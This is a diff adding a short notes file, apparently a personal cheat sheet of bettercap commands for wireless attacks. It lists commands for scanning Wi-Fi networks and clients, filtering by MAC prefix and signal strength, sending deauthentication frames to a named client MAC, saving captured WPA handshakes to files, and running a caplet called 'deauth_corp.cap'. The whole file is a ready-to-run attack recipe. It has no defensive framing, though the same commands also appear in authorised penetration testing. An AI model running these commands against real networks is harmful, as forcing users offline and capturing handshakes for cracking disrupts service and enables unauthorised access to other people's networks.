@@ -1,0 +1,58 @@
+
+sudo bettercap -iface wlan0
+
+wlan0  » wifi.recon on
+
+OR
+
+wlan0  » wifi.recon.channel 6,11
+
+
+---------------
+wlan0  » set ticker.commands "clear; wifi.show"
+wlan0  » wifi.recon on
+...
+wlan0  » ticker on
+---------------
+
+sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
+
+CLIENTS:
+
+wlan0  » wifi.recon c6:2d:56:2a:53:f8
+wlan0  » wifi.show
+
+FILTER CLIENTS:
+
+wlan0  » set wifi.show.filter ^c0
+wlan0  » wifi.show
+
+MIN RSSI:
+
+wlan0  » set wifi.show.filter ""
+wlan0  » set wifi.rssi.min -49
+wlan0  » wifi.show
+
+
+DEAUTH:
+wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+
+SEPARATE FILE FOR HANDSHAKES:
+wlan1  » wifi.recon off
+ wlan1  » get wifi.handshakes.file 
+    wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'
+
+ wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"
+ wlan0  » set wifi.handshakes.aggregate false
+ wlan0  » wifi.recon on
+ wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+
+ DONT DEAUTH AP:
+
+ wlan0  » set wifi.deauth.skip ac:22:0b:28:fd:22
+
+ CAPLETS RUN A SERIES OF COMMANDS:
+
+ sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+
+ 
